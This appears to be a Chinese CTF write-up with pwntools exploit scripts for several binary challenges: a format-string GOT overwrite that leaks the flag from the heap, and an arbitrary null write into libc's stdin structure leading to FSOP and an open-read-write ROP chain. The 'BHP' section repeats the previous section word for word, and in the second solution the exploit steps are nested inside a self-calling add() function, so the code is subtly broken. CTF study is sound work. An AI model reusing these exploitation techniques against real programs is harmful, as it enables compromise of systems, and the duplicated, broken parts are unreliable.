
![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_6Y56YJ2CXS2AGR2.webp)

当输入长度超过`0x100`，便可以覆盖`format`

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_9SM5UHBW6Q9YZAV.webp)

可以自由格式化字符串，但由于是`data`段的格式化字符串

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_T4YUYTRFG6BQRUU.webp)

但这里可以输入`0x10`字节，所以可以将`got`表写在栈上，但是由于`token`清空我们无法再次进入`scanf("%s")`

如果我们将`exit`的`got`表改写为`main`函数，在退出时便可以再次进入`main`中，`token`便会刷新，我们又可以控制格式化字符串参数

然后可以使用格式化字符串泄露堆地址

由于`flag`是文件，所以被串在`_IO_list_all`的链表中，位于堆上，其中的文件指针中包含`flag`的内容，只要稍微调试便可以找到`flag`字符串相对于堆地址的偏移

再次使用`exit`退出，最后一次格式化字符串将`flag`的地址写在栈上并使用`%s`参数泄露`flag`内容，便可以获得`flag`

```python
from pwn import *
#io=process('./pwn')
context.log_level='debug'
io=remote("47.93.216.175",38936)
def bug():
    gdb.attach(io,"b *0x4014bc")
    io.sendlineafter(b"2.exit",b"1")
    io.sendlineafter(b"how much you want to pay?",b"255")
    io.recvuntil(b"opened user.log, please report:\n")
    payload=f"%{0x40}c%13$hhn%{0x13c3-0x40}c%12$hn".encode()#0x4013C3
    io.sendline(b'a'*0x100+payload)
    io.sendline(b"1")
    got=0x404090
    io.send(p64(got)+p64(got+2))
    io.sendlineafter(b"2.exit",b"2")
    io.sendlineafter(b"2.exit",b"2")
    io.sendlineafter(b"2.exit",b"1")
    io.sendlineafter(b"how much you want to pay?",b"255")
    io.recvuntil(b"opened user.log, please report:\n")
    io.sendline(b'a'*0x100+b"%11$p")
    io.sendlineafter(b"2.exit",b"1")
    #io.recvuntil(b"how much you want to pay?\n")
    io.recvuntil(b"want to pay?\n")
    io.sendline(b"1")
    heap=int(io.recvuntil(b"we")[:-2],16)
    print(hex(heap))
    io.sendlineafter(b"2.exit",b"2")
    io.sendlineafter(b"2.exit",b"2")
    io.sendlineafter(b"2.exit",b"1")
    io.sendlineafter(b"how much you want to pay?",b"255")
    io.recvuntil(b"opened user.log, please report:\n")
    io.sendline(b'a'*0x100+b"%16$s")
    io.sendlineafter(b"2.exit",b"1")
    io.send(p64(heap+0x3c0)+p64(heap+0x3c0))
    io.interactive()
```

## file-system

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_92GPR47Q7MQBE6B.webp)

在`leak`中，可以输入`0x28`字节数据，泄露`libc`地址

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_97XSYJNWBT7PEMN.webp)

随后进入一个堆管理菜单

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_FEZTBJEYK4EXZTT.webp)

其中`edit`、`show`、`free`都没有什么用

`add`功能只能使用一次，但是没有限制申请堆块的大小

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_VCHW7A5B5MHXC46.webp)

这里的问题是没有对`malloc`大小进行检查，边直接进行`read`与`ptr+size-1`的置零

当`malloc`大小过大会`malloc`失败并返回`null`

所以当我们申请`addr+1`大小（足够大），便可以实现对任意`addr`的`null`写

由于我们已经知道了`libc`地址，便可以实现对任意`libc`地址的`null`写

`libc`的攻击面（`got`表，`IO`结构体，`IO_list_all`）

其中`2.39`中`got`已经不可写了，使用`null`攻击`IO_list_all`远远不够

如果攻击`stdout`结构体，最多只能泄露，但是我们已经有了`libc`地址

所以只剩下`stdin`可以攻击

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_PNJHN5XKQCVYWYP.webp)

在写入`null`时，`stdin`结构体的`read_base`为`0x74ee68c03963`，`read_ptr`为`0x74ee68c03964`

如果在`read_base`的末尾置`0`，下次走`IO`的输入函数便可以复写`stdin`结构体中`read`的三枚指针，可以在`libc`中任意长度写

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_J83KJHUFGXMUD7G.webp)

```python
from pwn import *
io=process('./pwn')
libc=ELF('./libc.so.6')
#io=remote("123.56.27.220",26633)
def bug():
    gdb.attach(io)
def add(size):
    io.sendlineafter(b"Choice: ",b"1")
    io.sendlineafter(b"Size: ",str(size).encode())
    io.send(b'a'*0x28)
    io.recvuntil(b'a'*0x28)
    base=u64(io.recv(6)+b'\x00\x00')-0xaddae
    print(hex(base))
    stdin=base+0x2038e0
    add(stdin+0x38+1)
    IO=base+libc.sym._IO_2_1_stdout_
    io.send(p64(0)*3+p64(IO)+p64(IO+0xa000))
```

由于开启了沙箱，使用`orw`绕过沙箱即可

直接在`IO`结构体中`FSOP`，使用`setcontext`进行栈迁移即可执行`ROP`

```python
from pwn import *
io=process('./pwn')
libc=ELF('./libc.so.6')
#io=remote("123.56.27.220",26633)
def bug():
    gdb.attach(io)
def add(size):
    io.sendlineafter(b"Choice: ",b"1")
    io.sendlineafter(b"Size: ",str(size).encode())
    io.send(b'a'*0x28)
    io.recvuntil(b'a'*0x28)
    base=u64(io.recv(6)+b'\x00\x00')-0xaddae
    print(hex(base))
    stdin=base+0x2038e0
    add(stdin+0x38+1)
    IO=base+libc.sym._IO_2_1_stdout_
    io.send(p64(0)*3+p64(IO)+p64(IO+0xa000))
    rdi=base+0x000000000010f78b
    rsi=base+0x0000000000110a7d
    rdx=base+0x0000000000138d05#movsxd rdx, ecx ; ret
    rcx=base+0x00000000000a877e
    jmp_gadget=base+0x00000000000ee303
    openat=base+libc.sym.openat
    read=base+libc.sym.read
    write=base+libc.sym.write
    #------------------------------------------------
    rop=p64(rdi)+p64(0x10000000000000000-100)
    rop+=p64(rsi)+p64(IO + 0xe8)
    rop+=p64(rcx)+p64(0)+p64(rdx)
    rop+=p64(rcx)+p64(0)
    rop+=p64(openat)
    rop+=p64(rdi)+p64(3)
    rop+=p64(rsi)+p64(IO+0xe0)
    rop+=p64(rcx)+p64(0x50)+p64(rdx)
    rop+=p64(read)
    rop+=p64(rdi)+p64(1)
    rop+=p64(rsi)+p64(IO+0xe0)
    rop+=p64(rcx)+p64(0x50)+p64(rdx)
    rop+=p64(write)
    #--------------------------------------------------
    fake_file = flat({
        0x0 : p64(0x320),
        0x10: p64(base+libc.sym.setcontext + 61),
        0x20: p64(IO),
        0x78: p64(jmp_gadget),
        0x88: p64(base+libc.sym._environ-0x10), # _lock_chain
        0xa0: p64(IO),
        0xa8: p64(jmp_gadget),
        0xd8: p64(base+libc.sym._IO_wfile_jumps + 0x10),
        0xe0: p64(IO-8)
    }, filler=b"\x00")
    fake_file+=b"./flag".ljust(0x10,b'\x00')
    fake_file+=rop
    io.sendafter("Choice:", fake_file)
    io.interactive()
```

## BHP

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_MQBQJF236AQE4SK.webp)

在`leak`中，可以输入`0x28`字节数据，泄露`libc`地址

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_39RMNP7B3ZYM3NM.webp)

随后进入一个堆管理菜单

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_R5CQMB4GQWRMEJA.webp)

其中`edit`、`show`、`free`都没有什么用

`add`功能只能使用一次，但是没有限制申请堆块的大小

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_WY8457BBKYAUK69.webp)

这里的问题是没有对`malloc`大小进行检查，边直接进行`read`与`ptr+size-1`的置零

当`malloc`大小过大会`malloc`失败并返回`null`

所以当我们申请`addr+1`大小（足够大），便可以实现对任意`addr`的`null`写

由于我们已经知道了`libc`地址，便可以实现对任意`libc`地址的`null`写

`libc`的攻击面（`got`表，`IO`结构体，`IO_list_all`）

其中`2.39`中`got`已经不可写了，使用`null`攻击`IO_list_all`远远不够

如果攻击`stdout`结构体，最多只能泄露，但是我们已经有了`libc`地址

所以只剩下`stdin`可以攻击

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_X9UR4K29YP9F72A.webp)

在写入`null`时，`stdin`结构体的`read_base`为`0x74ee68c03963`，`read_ptr`为`0x74ee68c03964`

如果在`read_base`的末尾置`0`，下次走`IO`的输入函数便可以复写`stdin`结构体中`read`的三枚指针，可以在`libc`中任意长度写

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_UHWHA2MWB4JCWCP.webp)
